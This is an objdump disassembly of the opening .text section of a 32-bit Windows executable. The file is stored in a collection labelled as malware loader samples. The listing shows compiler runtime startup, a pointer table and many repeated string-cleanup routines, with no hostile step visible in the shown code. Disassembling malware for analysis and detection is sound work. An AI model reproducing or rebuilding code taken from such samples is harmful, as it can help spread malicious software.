
malware_samples/loader/f4f34952b70000af0cb103ac9640d1029c0b68412ffc68da054c1e99e26a8a58.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	00 20                	add    %ah,(%eax)
  401002:	64 17                	fs pop %ss
  401004:	40                   	inc    %eax
  401005:	00 00                	add    %al,(%eax)
  401007:	20 dc                	and    %bl,%ah
  401009:	57                   	push   %edi
  40100a:	40                   	inc    %eax
  40100b:	00 00                	add    %al,(%eax)
  40100d:	20 a4 5d 40 00 00 fe 	and    %ah,-0x1ffffc0(%ebp,%ebx,2)
  401014:	4c                   	dec    %esp
  401015:	61                   	popa
  401016:	40                   	inc    %eax
  401017:	00 00                	add    %al,(%eax)
  401019:	20 9c 61 40 00 00 20 	and    %bl,0x20000040(%ecx,%eiz,2)
  401020:	ac                   	lods   %ds:(%esi),%al
  401021:	9c                   	pushf
  401022:	40                   	inc    %eax
  401023:	00 00                	add    %al,(%eax)
  401025:	20 20                	and    %ah,(%eax)
  401027:	ac                   	lods   %ds:(%esi),%al
  401028:	40                   	inc    %eax
  401029:	00 00                	add    %al,(%eax)
  40102b:	fe c8                	dec    %al
  40102d:	de 40 00             	fiadds 0x0(%eax)
  401030:	00 fe                	add    %bh,%dh
  401032:	f8                   	clc
  401033:	de 40 00             	fiadds 0x0(%eax)
  401036:	00 fe                	add    %bh,%dh
  401038:	28 df                	sub    %bl,%bh
  40103a:	40                   	inc    %eax
  40103b:	00 00                	add    %al,(%eax)
  40103d:	fe                   	(bad)
  40103e:	58                   	pop    %eax
  40103f:	df 40 00             	filds  0x0(%eax)
  401042:	00 fe                	add    %bh,%dh
  401044:	88 df                	mov    %bl,%bh
  401046:	40                   	inc    %eax
  401047:	00 00                	add    %al,(%eax)
  401049:	fe                   	(bad)
  40104a:	b8 df 40 00 00       	mov    $0x40df,%eax
  40104f:	fe                   	(bad)
  401050:	e8 df 40 00 00       	call   0x405134
  401055:	fe                   	(bad)
  401056:	18 e0                	sbb    %ah,%al
  401058:	40                   	inc    %eax
  401059:	00 00                	add    %al,(%eax)
  40105b:	20 58 e0             	and    %bl,-0x20(%eax)
  40105e:	40                   	inc    %eax
  40105f:	00 00                	add    %al,(%eax)
  401061:	20 e4                	and    %ah,%ah
  401063:	e3 40                	jecxz  0x4010a5
  401065:	00 00                	add    %al,(%eax)
  401067:	20 a8 e4 40 00 00    	and    %ch,0x40e4(%eax)
  40106d:	20 24 eb             	and    %ah,(%ebx,%ebp,8)
  401070:	40                   	inc    %eax
  401071:	00 00                	add    %al,(%eax)
  401073:	24 34                	and    $0x34,%al
  401075:	f2 40                	repnz inc %eax
  401077:	00 00                	add    %al,(%eax)
  401079:	20 94 f2 40 00 00 00 	and    %dl,0x40(%edx,%esi,8)
  401080:	ec                   	in     (%dx),%al
  401081:	09 41 00             	or     %eax,0x0(%ecx)
  401084:	00 05 e8 46 41 00    	add    %al,0x4146e8
  40108a:	00 04 58             	add    %al,(%eax,%ebx,2)
  40108d:	2d 41 00 00 04       	sub    $0x4000041,%eax
  401092:	e0 78                	loopne 0x40110c
  401094:	41                   	inc    %ecx
  401095:	00 00                	add    %al,(%eax)
  401097:	0a fc                	or     %ah,%bh
  401099:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40109a:	41                   	inc    %ecx
  40109b:	00 00                	add    %al,(%eax)
  40109d:	0a a4 ae 41 00 00 0a 	or     0xa000041(%esi,%ebp,4),%ah
  4010a4:	80 aa 41 00 00 0a f0 	subb   $0xf0,0xa000041(%edx)
  4010ab:	b4 41                	mov    $0x41,%ah
  4010ad:	00 00                	add    %al,(%eax)
  4010af:	01 6c c3 41          	add    %ebp,0x41(%ebx,%eax,8)
  4010b3:	00 00                	add    %al,(%eax)
  4010b5:	03 40 cf             	add    -0x31(%eax),%eax
  4010b8:	41                   	inc    %ecx
  4010b9:	00 00                	add    %al,(%eax)
  4010bb:	02 d4                	add    %ah,%dl
  4010bd:	d8 41 00             	fadds  0x0(%ecx)
  4010c0:	00 03                	add    %al,(%ebx)
  4010c2:	18 db                	sbb    %bl,%bl
  4010c4:	41                   	inc    %ecx
  4010c5:	00 00                	add    %al,(%eax)
  4010c7:	01 f8                	add    %edi,%eax
  4010c9:	e1 41                	loope  0x40110c
  4010cb:	00 00                	add    %al,(%eax)
  4010cd:	01 1c f1             	add    %ebx,(%ecx,%esi,8)
  4010d0:	41                   	inc    %ecx
  4010d1:	00 00                	add    %al,(%eax)
  4010d3:	20 9c f2 41 00 00 00 	and    %bl,0x41(%edx,%esi,8)
  4010da:	90                   	nop
  4010db:	f7 41 00 00 20 ec 02 	testl  $0x2ec2000,0x0(%ecx)
  4010e2:	42                   	inc    %edx
  4010e3:	00 00                	add    %al,(%eax)
  4010e5:	20 8c 08 42 00 00 00 	and    %cl,0x42(%eax,%ecx,1)
  4010ec:	2c f0                	sub    $0xf0,%al
  4010ee:	40                   	inc    %eax
  4010ef:	00 00                	add    %al,(%eax)
  4010f1:	00 08                	add    %cl,(%eax)
  4010f3:	48                   	dec    %eax
  4010f4:	41                   	inc    %ecx
  4010f5:	00 00                	add    %al,(%eax)
  4010f7:	04 f0                	add    $0xf0,%al
  4010f9:	78 41                	js     0x40113c
  4010fb:	00 00                	add    %al,(%eax)
  4010fd:	03 e0                	add    %eax,%esp
  4010ff:	d0 41 00             	rolb   $1,0x0(%ecx)
  401102:	00 02                	add    %al,(%edx)
  401104:	24 d9                	and    $0xd9,%al
  401106:	41                   	inc    %ecx
  401107:	00 00                	add    %al,(%eax)
  401109:	03 38                	add    (%eax),%edi
  40110b:	d9 41 00             	flds   0x0(%ecx)
  40110e:	00 00                	add    %al,(%eax)
  401110:	00 00                	add    %al,(%eax)
  401112:	00 00                	add    %al,(%eax)
  401114:	eb 10                	jmp    0x401126
  401116:	66 62 3a             	bound  %di,(%edx)
  401119:	43                   	inc    %ebx
  40111a:	2b 2b                	sub    (%ebx),%ebp
  40111c:	48                   	dec    %eax
  40111d:	4f                   	dec    %edi
  40111e:	4f                   	dec    %edi
  40111f:	4b                   	dec    %ebx
  401120:	90                   	nop
  401121:	e9 b0 20 42 00       	jmp    0x8231d6
  401126:	e8 61 b7 01 00       	call   0x41c88c
  40112b:	a1 a3 20 42 00       	mov    0x4220a3,%eax
  401130:	c1 e0 02             	shl    $0x2,%eax
  401133:	a3 a7 20 42 00       	mov    %eax,0x4220a7
  401138:	52                   	push   %edx
  401139:	6a 00                	push   $0x0
  40113b:	e8 86 01 02 00       	call   0x4212c6
  401140:	8b d0                	mov    %eax,%edx
  401142:	89 15 ab 20 42 00    	mov    %edx,0x4220ab
  401148:	e8 db 04 01 00       	call   0x411628
  40114d:	5a                   	pop    %edx
  40114e:	e8 bd e0 00 00       	call   0x40f210
  401153:	e8 d4 04 01 00       	call   0x41162c
  401158:	68 4c 20 42 00       	push   $0x42204c
  40115d:	6a 00                	push   $0x0
  40115f:	e8 62 01 02 00       	call   0x4212c6
  401164:	a3 ab 20 42 00       	mov    %eax,0x4220ab
  401169:	6a 00                	push   $0x0
  40116b:	e9 94 ce 01 00       	jmp    0x41e004
  401170:	33 c0                	xor    %eax,%eax
  401172:	a0 95 20 42 00       	mov    0x422095,%al
  401177:	c3                   	ret
  401178:	a1 ab 20 42 00       	mov    0x4220ab,%eax
  40117d:	c3                   	ret
  40117e:	60                   	pusha
  40117f:	bb 00 50 b0 bc       	mov    $0xbcb05000,%ebx
  401184:	53                   	push   %ebx
  401185:	68 ad 0b 00 00       	push   $0xbad
  40118a:	c3                   	ret
  40118b:	b9 2c 03 00 00       	mov    $0x32c,%ecx
  401190:	0b c9                	or     %ecx,%ecx
  401192:	74 4d                	je     0x4011e1
  401194:	83 3d a3 20 42 00 00 	cmpl   $0x0,0x4220a3
  40119b:	73 0a                	jae    0x4011a7
  40119d:	b8 fe 00 00 00       	mov    $0xfe,%eax
  4011a2:	e8 d7 ff ff ff       	call   0x40117e
  4011a7:	b9 2c 03 00 00       	mov    $0x32c,%ecx
  4011ac:	51                   	push   %ecx
  4011ad:	6a 08                	push   $0x8
  4011af:	e8 24 01 02 00       	call   0x4212d8
  4011b4:	50                   	push   %eax
  4011b5:	e8 4e 01 02 00       	call   0x421308
  4011ba:	0b c0                	or     %eax,%eax
  4011bc:	75 0a                	jne    0x4011c8
  4011be:	b8 fd 00 00 00       	mov    $0xfd,%eax
  4011c3:	e8 b6 ff ff ff       	call   0x40117e
  4011c8:	50                   	push   %eax
  4011c9:	50                   	push   %eax
  4011ca:	ff 35 a3 20 42 00    	push   0x4220a3
  4011d0:	e8 ef cf 01 00       	call   0x41e1c4
  4011d5:	ff 35 a3 20 42 00    	push   0x4220a3
  4011db:	e8 f4 cf 01 00       	call   0x41e1d4
  4011e0:	5f                   	pop    %edi
  4011e1:	c3                   	ret
  4011e2:	b9 2c 03 00 00       	mov    $0x32c,%ecx
  4011e7:	0b c9                	or     %ecx,%ecx
  4011e9:	74 19                	je     0x401204
  4011eb:	e8 a4 cf 01 00       	call   0x41e194
  4011f0:	a3 a3 20 42 00       	mov    %eax,0x4220a3
  4011f5:	83 f8 00             	cmp    $0x0,%eax
  4011f8:	73 91                	jae    0x40118b
  4011fa:	b8 fc 00 00 00       	mov    $0xfc,%eax
  4011ff:	e8 7a ff ff ff       	call   0x40117e
  401204:	c3                   	ret
  401205:	83 3d a3 20 42 00 00 	cmpl   $0x0,0x4220a3
  40120c:	72 28                	jb     0x401236
  40120e:	ff 35 a3 20 42 00    	push   0x4220a3
  401214:	e8 9b cf 01 00       	call   0x41e1b4
  401219:	0b c0                	or     %eax,%eax
  40121b:	74 19                	je     0x401236
  40121d:	50                   	push   %eax
  40121e:	6a 08                	push   $0x8
  401220:	e8 b3 00 02 00       	call   0x4212d8
  401225:	50                   	push   %eax
  401226:	e8 e3 00 02 00       	call   0x42130e
  40122b:	ff 35 a3 20 42 00    	push   0x4220a3
  401231:	e8 ae cf 01 00       	call   0x41e1e4
  401236:	c3                   	ret
  401237:	c3                   	ret
  401238:	83 3d a3 20 42 00 00 	cmpl   $0x0,0x4220a3
  40123f:	74 10                	je     0x401251
  401241:	e8 bf ff ff ff       	call   0x401205
  401246:	ff 35 a3 20 42 00    	push   0x4220a3
  40124c:	e8 53 cf 01 00       	call   0x41e1a4
  401251:	c3                   	ret
  401252:	a1 a3 20 42 00       	mov    0x4220a3,%eax
  401257:	64 67 8b 16 2c 00    	mov    %fs:0x2c,%edx
  40125d:	8b 04 82             	mov    (%edx,%eax,4),%eax
  401260:	c3                   	ret
  401261:	90                   	nop
  401262:	90                   	nop
  401263:	90                   	nop
  401264:	83 ec 0c             	sub    $0xc,%esp
  401267:	c7 04 24 0c 49 71 00 	movl   $0x71490c,(%esp)
  40126e:	e8 2d 56 00 00       	call   0x4068a0
  401273:	83 c4 0c             	add    $0xc,%esp
  401276:	c3                   	ret
  401277:	66 66 66 66 2e 0f 1f 	data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  40127e:	84 00 00 00 00 00 
  401284:	83 ec 0c             	sub    $0xc,%esp
  401287:	c7 04 24 0d 49 71 00 	movl   $0x71490d,(%esp)
  40128e:	e8 e9 a0 00 00       	call   0x40b37c
  401293:	83 c4 0c             	add    $0xc,%esp
  401296:	c3                   	ret
  401297:	66 66 66 66 2e 0f 1f 	data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  40129e:	84 00 00 00 00 00 
  4012a4:	83 ec 0c             	sub    $0xc,%esp
  4012a7:	8b 0d b4 5c 71 00    	mov    0x715cb4,%ecx
  4012ad:	83 f9 10             	cmp    $0x10,%ecx
  4012b0:	72 19                	jb     0x4012cb
  4012b2:	a1 a0 5c 71 00       	mov    0x715ca0,%eax
  4012b7:	41                   	inc    %ecx
  4012b8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4012be:	72 03                	jb     0x4012c3
  4012c0:	8b 40 fc             	mov    -0x4(%eax),%eax
  4012c3:	89 04 24             	mov    %eax,(%esp)
  4012c6:	e8 f5 49 00 00       	call   0x405cc0
  4012cb:	c7 05 b4 5c 71 00 0f 	movl   $0xf,0x715cb4
  4012d2:	00 00 00 
  4012d5:	c7 05 b0 5c 71 00 00 	movl   $0x0,0x715cb0
  4012dc:	00 00 00 
  4012df:	c6 05 a0 5c 71 00 00 	movb   $0x0,0x715ca0
  4012e6:	83 c4 0c             	add    $0xc,%esp
  4012e9:	c3                   	ret
  4012ea:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4012f1:	00 00 00 
  4012f4:	83 ec 0c             	sub    $0xc,%esp
  4012f7:	8b 0d d4 5c 71 00    	mov    0x715cd4,%ecx
  4012fd:	83 f9 10             	cmp    $0x10,%ecx
  401300:	72 19                	jb     0x40131b
  401302:	a1 c0 5c 71 00       	mov    0x715cc0,%eax
  401307:	41                   	inc    %ecx
  401308:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40130e:	72 03                	jb     0x401313
  401310:	8b 40 fc             	mov    -0x4(%eax),%eax
  401313:	89 04 24             	mov    %eax,(%esp)
  401316:	e8 a5 49 00 00       	call   0x405cc0
  40131b:	c7 05 d4 5c 71 00 0f 	movl   $0xf,0x715cd4
  401322:	00 00 00 
  401325:	c7 05 d0 5c 71 00 00 	movl   $0x0,0x715cd0
  40132c:	00 00 00 
  40132f:	c6 05 c0 5c 71 00 00 	movb   $0x0,0x715cc0
  401336:	83 c4 0c             	add    $0xc,%esp
  401339:	c3                   	ret
  40133a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401341:	00 00 00 
  401344:	83 ec 0c             	sub    $0xc,%esp
  401347:	8b 0d f4 5c 71 00    	mov    0x715cf4,%ecx
  40134d:	83 f9 10             	cmp    $0x10,%ecx
  401350:	72 19                	jb     0x40136b
  401352:	a1 e0 5c 71 00       	mov    0x715ce0,%eax
  401357:	41                   	inc    %ecx
  401358:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40135e:	72 03                	jb     0x401363
  401360:	8b 40 fc             	mov    -0x4(%eax),%eax
  401363:	89 04 24             	mov    %eax,(%esp)
  401366:	e8 55 49 00 00       	call   0x405cc0
  40136b:	c7 05 f4 5c 71 00 0f 	movl   $0xf,0x715cf4
  401372:	00 00 00 
  401375:	c7 05 f0 5c 71 00 00 	movl   $0x0,0x715cf0
  40137c:	00 00 00 
  40137f:	c6 05 e0 5c 71 00 00 	movb   $0x0,0x715ce0
  401386:	83 c4 0c             	add    $0xc,%esp
  401389:	c3                   	ret
  40138a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401391:	00 00 00 
  401394:	83 ec 0c             	sub    $0xc,%esp
  401397:	8b 0d 14 5d 71 00    	mov    0x715d14,%ecx
  40139d:	83 f9 10             	cmp    $0x10,%ecx
  4013a0:	72 19                	jb     0x4013bb
  4013a2:	a1 00 5d 71 00       	mov    0x715d00,%eax
  4013a7:	41                   	inc    %ecx
  4013a8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4013ae:	72 03                	jb     0x4013b3
  4013b0:	8b 40 fc             	mov    -0x4(%eax),%eax
  4013b3:	89 04 24             	mov    %eax,(%esp)
  4013b6:	e8 05 49 00 00       	call   0x405cc0
  4013bb:	c7 05 14 5d 71 00 0f 	movl   $0xf,0x715d14
  4013c2:	00 00 00 
  4013c5:	c7 05 10 5d 71 00 00 	movl   $0x0,0x715d10
  4013cc:	00 00 00 
  4013cf:	c6 05 00 5d 71 00 00 	movb   $0x0,0x715d00
  4013d6:	83 c4 0c             	add    $0xc,%esp
  4013d9:	c3                   	ret
  4013da:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4013e1:	00 00 00 
  4013e4:	83 ec 0c             	sub    $0xc,%esp
  4013e7:	8b 0d 34 5d 71 00    	mov    0x715d34,%ecx
  4013ed:	83 f9 10             	cmp    $0x10,%ecx
  4013f0:	72 19                	jb     0x40140b
  4013f2:	a1 20 5d 71 00       	mov    0x715d20,%eax
  4013f7:	41                   	inc    %ecx
  4013f8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4013fe:	72 03                	jb     0x401403
  401400:	8b 40 fc             	mov    -0x4(%eax),%eax
  401403:	89 04 24             	mov    %eax,(%esp)
  401406:	e8 b5 48 00 00       	call   0x405cc0
  40140b:	c7 05 34 5d 71 00 0f 	movl   $0xf,0x715d34
  401412:	00 00 00 
  401415:	c7 05 30 5d 71 00 00 	movl   $0x0,0x715d30
  40141c:	00 00 00 
  40141f:	c6 05 20 5d 71 00 00 	movb   $0x0,0x715d20
  401426:	83 c4 0c             	add    $0xc,%esp
  401429:	c3                   	ret
  40142a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401431:	00 00 00 
  401434:	83 ec 0c             	sub    $0xc,%esp
  401437:	8b 0d 54 5d 71 00    	mov    0x715d54,%ecx
  40143d:	83 f9 10             	cmp    $0x10,%ecx
  401440:	72 19                	jb     0x40145b
  401442:	a1 40 5d 71 00       	mov    0x715d40,%eax
  401447:	41                   	inc    %ecx
  401448:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40144e:	72 03                	jb     0x401453
  401450:	8b 40 fc             	mov    -0x4(%eax),%eax
  401453:	89 04 24             	mov    %eax,(%esp)
  401456:	e8 65 48 00 00       	call   0x405cc0
  40145b:	c7 05 54 5d 71 00 0f 	movl   $0xf,0x715d54
  401462:	00 00 00 
  401465:	c7 05 50 5d 71 00 00 	movl   $0x0,0x715d50
  40146c:	00 00 00 
  40146f:	c6 05 40 5d 71 00 00 	movb   $0x0,0x715d40
  401476:	83 c4 0c             	add    $0xc,%esp
  401479:	c3                   	ret
  40147a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401481:	00 00 00 
  401484:	83 ec 0c             	sub    $0xc,%esp
  401487:	8b 0d 74 5d 71 00    	mov    0x715d74,%ecx
  40148d:	83 f9 10             	cmp    $0x10,%ecx
  401490:	72 19                	jb     0x4014ab
  401492:	a1 60 5d 71 00       	mov    0x715d60,%eax
  401497:	41                   	inc    %ecx
  401498:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40149e:	72 03                	jb     0x4014a3
  4014a0:	8b 40 fc             	mov    -0x4(%eax),%eax
  4014a3:	89 04 24             	mov    %eax,(%esp)
  4014a6:	e8 15 48 00 00       	call   0x405cc0
  4014ab:	c7 05 74 5d 71 00 0f 	movl   $0xf,0x715d74
  4014b2:	00 00 00 
  4014b5:	c7 05 70 5d 71 00 00 	movl   $0x0,0x715d70
  4014bc:	00 00 00 
  4014bf:	c6 05 60 5d 71 00 00 	movb   $0x0,0x715d60
  4014c6:	83 c4 0c             	add    $0xc,%esp
  4014c9:	c3                   	ret
  4014ca:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4014d1:	00 00 00 
  4014d4:	83 ec 0c             	sub    $0xc,%esp
  4014d7:	8b 0d 94 5d 71 00    	mov    0x715d94,%ecx
  4014dd:	83 f9 10             	cmp    $0x10,%ecx
  4014e0:	72 19                	jb     0x4014fb
  4014e2:	a1 80 5d 71 00       	mov    0x715d80,%eax
  4014e7:	41                   	inc    %ecx
  4014e8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4014ee:	72 03                	jb     0x4014f3
  4014f0:	8b 40 fc             	mov    -0x4(%eax),%eax
  4014f3:	89 04 24             	mov    %eax,(%esp)
  4014f6:	e8 c5 47 00 00       	call   0x405cc0
  4014fb:	c7 05 94 5d 71 00 0f 	movl   $0xf,0x715d94
  401502:	00 00 00 
  401505:	c7 05 90 5d 71 00 00 	movl   $0x0,0x715d90
  40150c:	00 00 00 
  40150f:	c6 05 80 5d 71 00 00 	movb   $0x0,0x715d80
  401516:	83 c4 0c             	add    $0xc,%esp
  401519:	c3                   	ret
  40151a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401521:	00 00 00 
  401524:	83 ec 0c             	sub    $0xc,%esp
  401527:	8b 0d b4 5d 71 00    	mov    0x715db4,%ecx
  40152d:	83 f9 10             	cmp    $0x10,%ecx
  401530:	72 19                	jb     0x40154b
  401532:	a1 a0 5d 71 00       	mov    0x715da0,%eax
  401537:	41                   	inc    %ecx
  401538:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40153e:	72 03                	jb     0x401543
  401540:	8b 40 fc             	mov    -0x4(%eax),%eax
  401543:	89 04 24             	mov    %eax,(%esp)
  401546:	e8 75 47 00 00       	call   0x405cc0
  40154b:	c7 05 b4 5d 71 00 0f 	movl   $0xf,0x715db4
  401552:	00 00 00 
  401555:	c7 05 b0 5d 71 00 00 	movl   $0x0,0x715db0
  40155c:	00 00 00 
  40155f:	c6 05 a0 5d 71 00 00 	movb   $0x0,0x715da0
  401566:	83 c4 0c             	add    $0xc,%esp
  401569:	c3                   	ret
  40156a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401571:	00 00 00 
  401574:	83 ec 0c             	sub    $0xc,%esp
  401577:	8b 0d d4 5d 71 00    	mov    0x715dd4,%ecx
  40157d:	83 f9 10             	cmp    $0x10,%ecx
  401580:	72 19                	jb     0x40159b
  401582:	a1 c0 5d 71 00       	mov    0x715dc0,%eax
  401587:	41                   	inc    %ecx
  401588:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40158e:	72 03                	jb     0x401593
  401590:	8b 40 fc             	mov    -0x4(%eax),%eax
  401593:	89 04 24             	mov    %eax,(%esp)
  401596:	e8 25 47 00 00       	call   0x405cc0
  40159b:	c7 05 d4 5d 71 00 0f 	movl   $0xf,0x715dd4
  4015a2:	00 00 00 
  4015a5:	c7 05 d0 5d 71 00 00 	movl   $0x0,0x715dd0
  4015ac:	00 00 00 
  4015af:	c6 05 c0 5d 71 00 00 	movb   $0x0,0x715dc0
  4015b6:	83 c4 0c             	add    $0xc,%esp
  4015b9:	c3                   	ret
  4015ba:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4015c1:	00 00 00 
  4015c4:	83 ec 0c             	sub    $0xc,%esp
  4015c7:	8b 0d f4 5d 71 00    	mov    0x715df4,%ecx
  4015cd:	83 f9 10             	cmp    $0x10,%ecx
  4015d0:	72 19                	jb     0x4015eb
  4015d2:	a1 e0 5d 71 00       	mov    0x715de0,%eax
  4015d7:	41                   	inc    %ecx
  4015d8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4015de:	72 03                	jb     0x4015e3
  4015e0:	8b 40 fc             	mov    -0x4(%eax),%eax
  4015e3:	89 04 24             	mov    %eax,(%esp)
  4015e6:	e8 d5 46 00 00       	call   0x405cc0
  4015eb:	c7 05 f4 5d 71 00 0f 	movl   $0xf,0x715df4
  4015f2:	00 00 00 
  4015f5:	c7 05 f0 5d 71 00 00 	movl   $0x0,0x715df0
  4015fc:	00 00 00 
  4015ff:	c6 05 e0 5d 71 00 00 	movb   $0x0,0x715de0
  401606:	83 c4 0c             	add    $0xc,%esp
  401609:	c3                   	ret
  40160a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401611:	00 00 00 
  401614:	83 ec 0c             	sub    $0xc,%esp
  401617:	8b 0d 14 5e 71 00    	mov    0x715e14,%ecx
  40161d:	83 f9 10             	cmp    $0x10,%ecx
  401620:	72 19                	jb     0x40163b
  401622:	a1 00 5e 71 00       	mov    0x715e00,%eax
  401627:	41                   	inc    %ecx
  401628:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40162e:	72 03                	jb     0x401633
  401630:	8b 40 fc             	mov    -0x4(%eax),%eax
  401633:	89 04 24             	mov    %eax,(%esp)
  401636:	e8 85 46 00 00       	call   0x405cc0
  40163b:	c7 05 14 5e 71 00 0f 	movl   $0xf,0x715e14
  401642:	00 00 00 
  401645:	c7 05 10 5e 71 00 00 	movl   $0x0,0x715e10
  40164c:	00 00 00 
  40164f:	c6 05 00 5e 71 00 00 	movb   $0x0,0x715e00
  401656:	83 c4 0c             	add    $0xc,%esp
  401659:	c3                   	ret
  40165a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401661:	00 00 00 
  401664:	83 ec 0c             	sub    $0xc,%esp
  401667:	8b 0d 40 5e 71 00    	mov    0x715e40,%ecx
  40166d:	83 f9 10             	cmp    $0x10,%ecx
  401670:	72 19                	jb     0x40168b
  401672:	a1 2c 5e 71 00       	mov    0x715e2c,%eax
  401677:	41                   	inc    %ecx
  401678:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40167e:	72 03                	jb     0x401683
  401680:	8b 40 fc             	mov    -0x4(%eax),%eax
  401683:	89 04 24             	mov    %eax,(%esp)
  401686:	e8 35 46 00 00       	call   0x405cc0
  40168b:	c7 05 40 5e 71 00 0f 	movl   $0xf,0x715e40
  401692:	00 00 00 
  401695:	c7 05 3c 5e 71 00 00 	movl   $0x0,0x715e3c
  40169c:	00 00 00 
  40169f:	c6 05 2c 5e 71 00 00 	movb   $0x0,0x715e2c
  4016a6:	83 c4 0c             	add    $0xc,%esp
  4016a9:	c3                   	ret
  4016aa:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4016b1:	00 00 00 
  4016b4:	83 ec 0c             	sub    $0xc,%esp
  4016b7:	8b 0d 60 5e 71 00    	mov    0x715e60,%ecx
  4016bd:	83 f9 10             	cmp    $0x10,%ecx
  4016c0:	72 19                	jb     0x4016db
  4016c2:	a1 4c 5e 71 00       	mov    0x715e4c,%eax
  4016c7:	41                   	inc    %ecx
  4016c8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4016ce:	72 03                	jb     0x4016d3
  4016d0:	8b 40 fc             	mov    -0x4(%eax),%eax
  4016d3:	89 04 24             	mov    %eax,(%esp)
  4016d6:	e8 e5 45 00 00       	call   0x405cc0
  4016db:	c7 05 60 5e 71 00 0f 	movl   $0xf,0x715e60
  4016e2:	00 00 00 
  4016e5:	c7 05 5c 5e 71 00 00 	movl   $0x0,0x715e5c
  4016ec:	00 00 00 
  4016ef:	c6 05 4c 5e 71 00 00 	movb   $0x0,0x715e4c
  4016f6:	83 c4 0c             	add    $0xc,%esp
  4016f9:	c3                   	ret
  4016fa:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401701:	00 00 00 
  401704:	83 ec 0c             	sub    $0xc,%esp
  401707:	8b 0d 80 5e 71 00    	mov    0x715e80,%ecx
  40170d:	83 f9 10             	cmp    $0x10,%ecx
  401710:	72 19                	jb     0x40172b
  401712:	a1 6c 5e 71 00       	mov    0x715e6c,%eax
  401717:	41                   	inc    %ecx
  401718:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40171e:	72 03                	jb     0x401723
  401720:	8b 40 fc             	mov    -0x4(%eax),%eax
  401723:	89 04 24             	mov    %eax,(%esp)
  401726:	e8 95 45 00 00       	call   0x405cc0
  40172b:	c7 05 80 5e 71 00 0f 	movl   $0xf,0x715e80
  401732:	00 00 00 
  401735:	c7 05 7c 5e 71 00 00 	movl   $0x0,0x715e7c
  40173c:	00 00 00 
  40173f:	c6 05 6c 5e 71 00 00 	movb   $0x0,0x715e6c
  401746:	83 c4 0c             	add    $0xc,%esp
  401749:	c3                   	ret
  40174a:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  401751:	00 00 00 
  401754:	c3                   	ret
  401755:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  40175c:	0f 1f 84 00 00 00 00 
  401763:	00 
  401764:	55                   	push   %ebp
  401765:	89 e5                	mov    %esp,%ebp
  401767:	53                   	push   %ebx
  401768:	57                   	push   %edi
  401769:	56                   	push   %esi
  40176a:	81 ec bc 00 00 00    	sub    $0xbc,%esp
  401770:	8a 1d 90 5e 71 00    	mov    0x715e90,%bl
  401776:	c7 85 7c ff ff ff ec 	movl   $0x4204ec,-0x84(%ebp)
  40177d:	04 42 00 
  401780:	c7 45 80 a0 27 42 00 	movl   $0x4227a0,-0x80(%ebp)
  401787:	89 6d 84             	mov    %ebp,-0x7c(%ebp)
  40178a:	89 65 8c             	mov    %esp,-0x74(%ebp)
  40178d:	c7 45 84 d3 1a 40 00 	movl   $0x401ad3,-0x7c(%ebp)
  401794:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40179a:	e8 b6 f9 01 00       	call   0x421155
  40179f:	80 fb 00             	cmp    $0x0,%bl
  4017a2:	75 2a                	jne    0x4017ce
  4017a4:	c7 05 88 5e 71 00 b8 	movl   $0x4057b8,0x715e88
  4017ab:	57 40 00 
  4017ae:	c7 04 24 54 17 40 00 	movl   $0x401754,(%esp)
  4017b5:	e8 ee b4 01 00       	call   0x41cca8
  4017ba:	c7 05 94 5e 71 00 00 	movl   $0x0,0x715e94
  4017c1:	00 00 00 
  4017c4:	c7 05 90 5e 71 00 01 	movl   $0x1,0x715e90
  4017cb:	00 00 00 
  4017ce:	c7 05 80 35 71 00 88 	movl   $0x715e88,0x713580
  4017d5:	5e 71 00 
  4017d8:	c7 05 08 49 71 00 ff 	movl   $0xffffffff,0x714908
  4017df:	ff ff ff 
  4017e2:	c7 05 88 35 71 00 71 	movl   $0x1571,0x713588
  4017e9:	15 00 00 
  4017ec:	b9 71 15 00 00       	mov    $0x1571,%ecx
  4017f1:	b8 91 fd ff ff       	mov    $0xfffffd91,%eax
  4017f6:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  4017fd:	1f 84 00 00 00 00 00 
